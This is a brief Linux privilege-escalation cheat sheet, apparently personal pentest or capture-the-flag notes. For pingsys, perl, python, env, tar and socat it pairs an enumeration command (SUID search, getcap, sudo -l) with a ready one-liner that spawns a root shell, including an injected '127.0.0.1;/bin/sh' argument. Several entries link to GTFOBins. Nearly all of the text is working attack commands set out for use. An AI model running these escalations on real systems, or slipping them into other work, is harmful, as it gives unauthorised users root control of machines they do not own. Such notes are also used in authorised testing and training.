# PINGSYS
```
find / -perm /4000 -type f 2>/dev/null           
```   
If:
/usr/bin/pingsys
```
/usr/bin/pingsys '127.0.0.1;/bin/sh'
```
# PERL
https://gtfobins.github.io/gtfobins/perl/
```    
getcap -r / 2> /dev/null
```
If:
/usr/bin/perl = cap_setuid+ep
```
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
# PYTHON
https://gtfobins.github.io/gtfobins/python/#suid
```
find / -user root -perm /4000
```
If:
/usr/bin/python
```
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
# ENV
https://gtfobins.github.io/gtfobins/env/#suid
```
find / -user root -perm /4000
```
If:
/usr/bin/env
```
/usr/bin/env /bin/sh -p
```
# TAR
https://gtfobins.github.io/gtfobins/tar/
```
sudo -l
```
If:
User ??? may run the following commands on ???: 

   (root) /bin/tar
```    
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

# SOCAT
https://gtfobins.github.io/gtfobins/socat/#sudo
```
sudo -l
```
If:
/usr/bin/socat

```    
sudo socat stdin exec:/bin/sh
```

